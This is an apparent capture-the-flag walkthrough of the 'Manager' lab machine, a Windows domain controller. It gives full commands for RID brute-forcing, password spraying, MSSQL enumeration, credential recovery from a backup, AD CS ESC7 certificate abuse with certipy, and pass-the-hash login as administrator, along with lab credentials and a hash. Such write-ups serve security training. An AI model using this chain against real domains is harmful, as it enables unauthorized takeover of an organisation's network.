## Nmap

```
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-title: Manager
|_http-server-header: Microsoft-IIS/10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-04 13:36:26Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.manager.htb
| Issuer: commonName=manager-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-30T17:08:51
| Not valid after:  2122-07-27T10:31:04
| MD5:     bc56 af22 5a3d db67 c9bb a439 4232 14d1
| SHA-1:   2b6d 98b3 d379 df64 59f6 c665 d4b7 53b0 faf6 e07a
|_SHA-256: 6ac0 287f 3fa6 2efd 7378 57c6 4a2c 10f9 ba7d 28be dfff 6f26 bc7b 415b bd04 a798
|_ssl-date: 2026-09-04T13:37:57+00:00; +7h00m00s from scanner time.
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb, Site: Default-First-Site-Name)
|_ssl-date: 2026-09-04T13:37:56+00:00; +6h59m59s from scanner time.
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.manager.htb
| Issuer: commonName=manager-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-30T17:08:51
| Not valid after:  2122-07-27T10:31:04
| MD5:     bc56 af22 5a3d db67 c9bb a439 4232 14d1
| SHA-1:   2b6d 98b3 d379 df64 59f6 c665 d4b7 53b0 faf6 e07a
|_SHA-256: 6ac0 287f 3fa6 2efd 7378 57c6 4a2c 10f9 ba7d 28be dfff 6f26 bc7b 415b bd04 a798
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   10.129.53.168:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433
|_ssl-date: 2026-09-04T13:37:57+00:00; +7h00m00s from scanner time.
| ms-sql-ntlm-info: 
|   10.129.53.168:1433: 
|     Target_Name: MANAGER
|     NetBIOS_Domain_Name: MANAGER
|     NetBIOS_Computer_Name: DC01
|     DNS_Domain_Name: manager.htb
|     DNS_Computer_Name: dc01.manager.htb
|     DNS_Tree_Name: manager.htb
|_    Product_Version: 10.0.17763
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-09-04T13:33:55
| Not valid after:  2056-09-04T13:33:55
| MD5:     5ab5 0411 0ee3 7bf6 181f f41d 60d4 61f8
| SHA-1:   52fb 248d cae0 9c03 42e2 f293 3d07 6d95 b93c 412c
|_SHA-256: 1b8d 5b4c 95c2 b8e2 756b 174a f153 e04c 3bf5 3a35 ad81 e0ff b24e d25d e81a 8ca9
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: manager.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.manager.htb
| Issuer: commonName=manager-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-30T17:08:51
| Not valid after:  2122-07-27T10:31:04
| MD5:     bc56 af22 5a3d db67 c9bb a439 4232 14d1
| SHA-1:   2b6d 98b3 d379 df64 59f6 c665 d4b7 53b0 faf6 e07a
|_SHA-256: 6ac0 287f 3fa6 2efd 7378 57c6 4a2c 10f9 ba7d 28be dfff 6f26 bc7b 415b bd04 a798
|_ssl-date: 2026-09-04T13:37:57+00:00; +7h00m00s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: manager.htb, Site: Default-First-Site-Name)
| ssl-cert: Subject: 
| Subject Alternative Name: DNS:dc01.manager.htb
| Issuer: commonName=manager-DC01-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2024-08-30T17:08:51
| Not valid after:  2122-07-27T10:31:04
| MD5:     bc56 af22 5a3d db67 c9bb a439 4232 14d1
| SHA-1:   2b6d 98b3 d379 df64 59f6 c665 d4b7 53b0 faf6 e07a
|_SHA-256: 6ac0 287f 3fa6 2efd 7378 57c6 4a2c 10f9 ba7d 28be dfff 6f26 bc7b 415b bd04 a798
|_ssl-date: 2026-09-04T13:37:56+00:00; +6h59m59s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49693/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49694/tcp open  msrpc         Microsoft Windows RPC
49697/tcp open  msrpc         Microsoft Windows RPC
49726/tcp open  msrpc         Microsoft Windows RPC
49770/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-09-04T13:37:16
|_  start_date: N/A
|_clock-skew: mean: 6h59m59s, deviation: 0s, median: 6h59m59s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

```

## Port 80

After checking the website, it is a website about a company offering content readability improvement.

![](pics/Pasted%20image%2020260904094651.png)

Trying to fuzz endpoints

```
ffuf -u http://manager.htb/FUZZ -w <wordlist>
```

![](pics/Pasted%20image%2020260904095149.png)

Tried using the trace method to see if something is leaked

```
curl -v -X TRACE manager.htb
```

![](pics/Pasted%20image%2020260904100904.png)
## SMB

Check null login

```
nxc smb manager.htb
```

![](pics/Pasted%20image%2020260904094124.png)

Listing the shares via guest user

```
nxc smb manager.htb -u 'guest' -p '' --shares
```

![](pics/Pasted%20image%2020260904094231.png)

The `IPC$` share is empty as usual

![](pics/Pasted%20image%2020260904094317.png)

### RID-Brute

Now using the guest to bruteforce `RID`

```
nxc smb manager.htb -u 'guest' -p '' --rid-brute <MAX_RID>
```

![](pics/Pasted%20image%2020260904103813.png)

Dumped the users into a file then cleaned them via `grep` and `sed`

```bash
cat users.txt | grep -oE ': [a-zA-Z()\ -$0-9]*' | sed 's/: //'
```

```
MANAGER\Enterprise Read-only Domain Controllers (SidTypeGroup)
MANAGER\Administrator (SidTypeUser)
MANAGER\Guest (SidTypeUser)
MANAGER\krbtgt (SidTypeUser)
MANAGER\Domain Admins (SidTypeGroup)
MANAGER\Domain Users (SidTypeGroup)
MANAGER\Domain Guests (SidTypeGroup)
MANAGER\Domain Computers (SidTypeGroup)
MANAGER\Domain Controllers (SidTypeGroup)
MANAGER\Cert Publishers (SidTypeAlias)
MANAGER\Schema Admins (SidTypeGroup)
MANAGER\Enterprise Admins (SidTypeGroup)
MANAGER\Group Policy Creator Owners (SidTypeGroup)
MANAGER\Read-only Domain Controllers (SidTypeGroup)
MANAGER\Cloneable Domain Controllers (SidTypeGroup)
MANAGER\Protected Users (SidTypeGroup)
MANAGER\Key Admins (SidTypeGroup)
MANAGER\Enterprise Key Admins (SidTypeGroup)
MANAGER\RAS and IAS Servers (SidTypeAlias)
MANAGER\Allowed RODC Password Replication Group (SidTypeAlias)
MANAGER\Denied RODC Password Replication Group (SidTypeAlias)
MANAGER\DC01$ (SidTypeUser)
MANAGER\DnsAdmins (SidTypeAlias)
MANAGER\DnsUpdateProxy (SidTypeGroup)
MANAGER\SQLServer2005SQLBrowserUser$DC01 (SidTypeAlias)
MANAGER\Zhong (SidTypeUser)
MANAGER\Cheng (SidTypeUser)
MANAGER\Ryan (SidTypeUser)
MANAGER\Raven (SidTypeUser)
MANAGER\JinWoo (SidTypeUser)
MANAGER\ChinHae (SidTypeUser)
MANAGER\Operator (SidTypeUser)
```

The non-default users extraction

```bash
cat users.txt | grep -oE ': [a-zA-Z()\ -$0-9]*' | sed 's/: //' | cut -d'\' -f2 | awk '{print $1}'
```

```
SQLServer2005SQLBrowserUser$DC01
Zhong
Cheng
Ryan
Raven
JinWoo
ChinHae
Operator
```

### Password Spray

First I tried the usernames as passwords, change things to lower case always

```
nxc smb 10.129.53.168 -u lower_users.txt -p lower_users.txt --no-bruteforce --continue-on-success
```

![](pics/Pasted%20image%2020260904113705.png)

New creds found

```
SQLServer2005SQLBrowserUser$DC01:SQLServer2005SQLBrowserUser$DC01
operator:operator
```

Since this looks like a DB user lets try to login to `mssql`.
## ms-sql

Since the server did not apply any patches or fixes

```
1433/tcp  open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ms-sql-info: 
|   10.129.53.168:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
```

Using the password we found earlier

```
nxc mssql 10.129.53.168 -u 'SQLServer2005SQLBrowserUser$DC01' -p 'SQLServer2005SQLBrowserUser$DC01'

nxc mssql 10.129.53.168 -u 'operator' -p 'operator'
```

![](pics/Pasted%20image%2020260904113824.png)

The `operator` user authenticated to the mssql server.

Using `mssqlclient` to interact 

```
impacket-mssqlclient 'manager.htb/operator:operator@10.129.53.168'
```

![](pics/Pasted%20image%2020260904114119.png)

Which failed with error `Login failed for user`

Using `-windows-auth` flag

```
impacket-mssqlclient 'manager.htb/operator:operator@10.129.53.168' -windows-auth
```

![](pics/Pasted%20image%2020260904114219.png)

I am in.

### enum DB

![](pics/Pasted%20image%2020260904114338.png)

### enum Users

![](pics/Pasted%20image%2020260904114359.png)

### xp_cmmdshell

![](pics/Pasted%20image%2020260904114454.png)

No permission
### xp_dirtree

![](pics/Pasted%20image%2020260904114639.png)

Found a recovery directory, lets see what it contains

![](pics/Pasted%20image%2020260904114726.png)

Realized I can not download the file, So I looked into the webserver files

![](pics/Pasted%20image%2020260904115641.png)

There is a file called `website-backup-27-07-23-old.zip` which we can try to access from the website itself.

![](pics/Pasted%20image%2020260904115753.png)

### Looking thru old files

A file named `.old-conf.xml`, which sound like a configuration file caught my attention

![](pics/Pasted%20image%2020260904120017.png)

Turns out it is a ldap conf file containing creds for the user `raven`

```
raven:R4v3nBe5tD3veloP3r!123
```

## Flag 1

Login via evil-winRM

```
evil-winrm -i manager.htb -u raven -p 'R4v3nBe5tD3veloP3r!123'
```

![](pics/Pasted%20image%2020260904133212.png)
## LDAP

Running bloodhound collector

```
bloodhound-python -u raven -p 'R4v3nBe5tD3veloP3r!123' -d manager.htb -ns 10.129.53.168 -c All --zip
```

![](pics/Pasted%20image%2020260904133124.png)

Nothing useful.

## templates enum

```
certipy find -u raven -p 'R4v3nBe5tD3veloP3r!123' -vulnerable -target-ip 10.129.53.168
```

![](pics/Pasted%20image%2020260904133859.png)

## ESC7

Add ourself into the `Manage CA` role

```bash
certipy ca \
    -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' \
    -ns '10.129.53.168' -target 'dc01.manager.htb' \
    -ca 'manager-DC01-CA' -add-officer 'raven'
```

![](pics/Pasted%20image%2020260904134632.png)

Note: This is not necessary in this case because `Raven` is an officer already

```
ManageCa: 
	MANAGER.HTB\Administrators
    MANAGER.HTB\Domain Admins
    MANAGER.HTB\Enterprise Admins
    MANAGER.HTB\Raven
```

Now after we added `raven` as an officer. lets ensure `SubCA` is enabled

```bash
certipy ca \
    -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' \
    -ns '10.129.53.168' -target 'manager.htb' \
    -ca 'manager-DC01-CA' -enable-template 'SubCA'
```

![](pics/Pasted%20image%2020260904135734.png)

Get the `administrator` SID

![](pics/Pasted%20image%2020260904140102.png)

```
S-1-5-21-4078382237-1492182817-2568127209-500
```

Submit a request using `SubCA` template

```bash
certipy req \
    -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' \
    -dc-ip '10.129.53.168' -target 'manager.htb' \
    -ca 'manager-DC01-CA' -template 'SubCA' \
    -upn 'administrator@manager.htb' -sid 'S-1-5-21-4078382237-1492182817-2568127209-500'
```

![](pics/Pasted%20image%2020260904140252.png)

Saving the key and the `ID` anyway even if we dont have enrollment rights.

```
Request ID is 20
Wrote private key to '20.key'
```

Approve the pending request

```
certipy ca \
    -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' \
    -ns '10.129.53.168' -target 'dc01.manager.htb' \
    -ca 'manager-DC01-CA' -issue-request '20'
```

![](pics/Pasted%20image%2020260904140943.png)

I tried both on target `manager.htb` and `dc01.manager.htb` failed. But when rerun the command 

```bash
certipy ca \
    -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' \
    -ns '10.129.53.168' -target 'dc01.manager.htb' \
    -ca 'manager-DC01-CA' -add-officer 'raven'
```

![](pics/Pasted%20image%2020260904141135.png)

Retrieve the issued certificate

```bash
certipy req \
    -u 'raven@manager.htb' -p 'R4v3nBe5tD3veloP3r!123' \
    -dc-ip '10.129.53.168' -target 'dc01.manager.htb' \
    -ca 'manager-DC01-CA' -retrieve '20'
```

![](pics/Pasted%20image%2020260904141250.png)

Using the `.pfx` file to get the NTLM hash

```
certipy auth -pfx administrator.pfx -dc-ip 10.129.53.168
```

![](pics/Pasted%20image%2020260904141515.png)

Time sync error

![](pics/Pasted%20image%2020260904141541.png)

Using this hash to login

```
administrator:ae5064c2f62317332c88629e025924ef
```

Evil win-rm is used 

```
evil-winrm -i 10.129.53.168 -u administrator -H 'ae5064c2f62317332c88629e025924ef'
```
## Flag 2

![](pics/Pasted%20image%2020260904141715.png)

Done.

![](pics/Pasted%20image%2020260904141755.png)


## Resources

https://github.com/ly4k/Certipy/wiki/06-%E2%80%90-Privilege-Escalation
 